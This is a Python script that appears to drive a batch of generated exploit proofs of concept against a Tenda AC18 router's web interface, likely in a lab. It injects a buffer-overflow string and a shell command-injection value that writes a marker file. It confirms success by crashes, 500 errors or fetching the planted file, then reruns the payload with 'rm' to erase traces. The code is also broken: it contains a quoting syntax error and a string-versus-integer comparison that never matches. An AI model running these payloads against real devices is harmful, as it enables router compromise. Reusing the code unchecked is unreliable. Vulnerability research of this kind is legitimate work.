#!/usr/bin/env python3
import subprocess
import tempfile
from pathlib import Path
import time
import shutil
import platform
import sys

# while true; do /bin/httpd || echo "[!] httpd crashed at $(date)"; sleep 1; done
# for i in {1..200}; do python exec_poc.py; done

def _play_gugu() -> None:
    system = platform.system()
    if system == "Windows":
        import winsound
        winsound.MessageBeep(winsound.MB_ICONASTERISK)
    elif system == "Darwin":
        subprocess.run(["osascript", "-e", "beep"], check=False)
    else:
        sys.stdout.write("\a")
        sys.stdout.flush()


def _wget_test() -> int:
    print("  🔍 Detected '123.txt' in the script, simulating a wget request http://192.168.153.2/123.txt")
    try:
        wget_result = subprocess.run(
            ["wget", "-qO-", "http://192.168.153.2/123.txt"],
            capture_output=True,
            text=True
        )
        if wget_result.stdout.strip() == "hacker":
            print("  🌐 wget response content：", wget_result.stdout.strip())
            return 1
        elif wget_result.stdout.strip() == "":
            print("  🌐 wget response content is empty")
            return 0
        return 0
    except Exception as e:
        print("  ❗ wget request failed：", str(e))
        return 0


def _load_progress(progress_path: Path) -> int:
    if progress_path.exists():
        try:
            return int(progress_path.read_text())
        except Exception:
            return 0
    return 0


def _save_progress(progress_path: Path, index: int) -> None:
    progress_path.write_text(str(index))
    print(f"💾 Progress saved: next time start from entry {index}")


def _ensure_clean_dir(path: Path) -> None:
    if path.exists():
        shutil.rmtree(path)
    path.mkdir(parents=True, exist_ok=True)


def _prepare_script(code: str) -> Path:
    with tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w", encoding="utf-8") as f:
        f.write(code)
        return Path(f.name)


def _replace_placeholders(code: str) -> str:
    # 固Set replacement: do not read from environment variables
    overflow_payload = "A" * 2000
    cmdi_payload = ";echo hacker > /webroot/123.txt"
    code = code.replace("{overflow}", overflow_payload)
    code = code.replace("{cmdi}", cmdi_payload)
    return code


def _verify_success_scripts(vendor: str, product: str) -> None:
    """Validate all scripts in the success directory to ensure they produce EXCEPTION or 500 output."""
    base_dir = Path(f"./{vendor}/{product}")
    success_dir = base_dir / "success"
    
    if not success_dir.exists():
        print("❌ The success directory does not exist; skipping validation")
        return
    
    success_files = sorted(success_dir.glob("*.py"))
    if not success_files:
        print("❌ The success directory is empty; skipping validation")
        return
    
    print(f"\n🔍 Starting validation of {len(success_files)} successful scripts…")
    
    verified_count = 0
    
    for script_path in success_files:
        print(f"  🧪 Validating {script_path.name}…")
        
        try:
            for _ in range(1, 5000):
                result = subprocess.run([sys.executable, str(script_path)], 
                                  capture_output=True, text=True, timeout=500)
                output = result.stdout.strip() + result.stderr.strip()

                # Check whether the output meets the expected result
                if "EXCEPTION" in output:
                    print(f"    ✅ Validation passed — produced EXCEPTION")
                    verified_count += 1
                    time.sleep(5)
                    break
                elif "500" in output:
                    print(f"    ✅ Validation passed — produced a 500 status code")
                    verified_count += 1
                    time.sleep(5)
                    break
                else:
                    continue
                
        except subprocess.TimeoutExpired:
            print(f"    ⚠️ Verification Timeout - Script execution exceeded 5 minutes")
        except Exception as e:
            print(f"    ❌ Verification Error - {str(e)}")
    
    print(f"\n📊 Verification Results: {verified_count} passed")
    if verified_count == len(success_files):
        print("🎉 All successful scripts verified！")


def execute_vendor_product(vendor: str, product: str, delete_success_tag) -> None:
    base_dir = Path(f"./{vendor}/{product}")
    output_dir = base_dir / "output"
    success_dir = base_dir / "success"
    progress_path = base_dir / "progress.txt"

    if delete_success_tag == 1:
        # Clear the success directory before running exec
        _ensure_clean_dir(success_dir)
    else:
        pass

    poc_files = sorted(output_dir.rglob("*.py"))
    start_idx = _load_progress(progress_path)
    total = len(poc_files)
    print(f"▶️ Starting test from POC {start_idx}, {total} files total.\n")
    time.sleep(1)

    # Log successful URI_Target prefixes to skip subsequent files with the same prefix.
    successful_prefixes = set()

    for i, path in enumerate(poc_files[start_idx:], start=start_idx):
        # Extract URI_Target prefix from filename
        # Filename format: URI_Target_ID.py, e.g., AdvSetLanip_ssid_1.py
        name_stem = path.stem
        parts = name_stem.split("_")
        
        # Extract the URI_Target prefix (excluding the trailing ID)
        # A correctly formatted filename should consist of at least three parts: URI, Target, and ID
        if len(parts) >= 3:
            uri_target_prefix = "_".join(parts[:-1])  # 去掉最后的 ID
        else:
            # If the format does not meet expectations, use the full filename as the prefix (for backward compatibility)
            uri_target_prefix = name_stem
        
        # Check if a file with the same prefix has already succeeded
        if uri_target_prefix in successful_prefixes:
            print(f"⏭️  跳过 {path.relative_to(base_dir)} (相同 URI_Target 已成功: {uri_target_prefix})")
            _save_progress(progress_path, i + 1)
            continue
        
        print(f"🚀 执行 {path.relative_to(base_dir)}")
        original_code = path.read_text(encoding="utf-8")

        # Derive the URI from the filename and replace {URI} in the template
        try:
            uri_from_name = name_stem.split("_", 1)[0]
        except Exception:
            uri_from_name = ""
        mutated = original_code
        if "{URI}" in mutated:
            mutated = mutated.replace("{URI}", f"/{uri_from_name}" if uri_from_name else "/")

        # Replace {overflow} and {cmdi}
        mutated = _replace_placeholders(mutated)

        # Write the replaced script back to the original file to satisfy the "save" requirement
        try:
            path.write_text(mutated, encoding="utf-8")
        except Exception as e:
            print("  ❗ Failed to overwrite the script：", str(e))

        script_path = _prepare_script(mutated)
        try:
            for attempt in range(1, 8):
                print(f"  🔁 Attempt {attempt}/7")
                result = subprocess.run([sys.executable, str(script_path)], capture_output=True, text=True)
                output = result.stdout.strip() + result.stderr.strip()
                print("  Response:", output)

                if "EXCEPTION" in output:
                    print("  ❌ EXCEPTION caught; terminating program immediately")
                    shutil.copy(path, success_dir / path.name)
                    # Mark this URI_Target prefix as successful
                    successful_prefixes.add(uri_target_prefix)
                    print(f"  📌 Mark {uri_target_prefix} as successful; subsequent tests with the same prefix will be skipped")
                    _save_progress(progress_path, i + 1)
                    _play_gugu()
                    print(f"POC execution terminated unexpectedly: {path.name} Output info: {output}")
                    time.sleep(5)
                    break

                if "TIMEOUT" in output:
                    print("  ⚠ TIMEOUT")
                    time.sleep(5)

                elif "500" in output:
                    print("  ✅ Mark as successful (500), copy to success directory, and abort further testing for this file")
                    shutil.copy(path, success_dir / path.name)
                    # Mark this URI_Target prefix as successful
                    successful_prefixes.add(uri_target_prefix)
                    print(f"  📌 Mark {uri_target_prefix} as successful; subsequent tests with the same prefix will be skipped")
                    break

                elif "200" in output:
                    time.sleep(1)

                flag = 0
                if '123.txt' in mutated:
                    flag = _wget_test()

                if flag == 1:
                    shutil.copy(path, success_dir / path.name)
                    # Mark this URI_Target prefix as successful
                    successful_prefixes.add(uri_target_prefix)
                    print(f"  📌 Mark {uri_target_prefix} as successful; subsequent tests with the same prefix will be skipped")
                    # Secondary execution for trace cleaning (no write-back to original file)
                    cleaned = mutated.replace(';echo hacker >', ';rm ')
                    tmp2 = _prepare_script(cleaned)
                    subprocess.run([sys.executable, str(tmp2)], capture_output=True, text=True)
                    tmp2.unlink(missing_ok=True)
                    _wget_test()
                    break

            _save_progress(progress_path, i + 1)
        finally:
            script_path.unlink(missing_ok=True)

    print("\n✅ All POC tests completed")
    
    # Execute Verification
    _verify_success_scripts(vendor, product)


def verify_only(vendor: str, product: str) -> None:
    """Run verification only; skip POC testing"""
    print(f"🔍 Verification Only Mode: {vendor}/{product}")
    _verify_success_scripts(vendor, product)


def main() -> None:
    vendor = "Tenda"
    product = "AC18"
    
    # Check command-line arguments
    if len(sys.argv) > 1 and sys.argv[1] == "verify":
        verify_only(vendor, product)
    else:
        delete_success_tag = input("Please enter ('1' to clear the "success" folder, '0' to skip): ")
        execute_vendor_product(vendor, product, delete_success_tag)


if __name__ == "__main__":
    main()
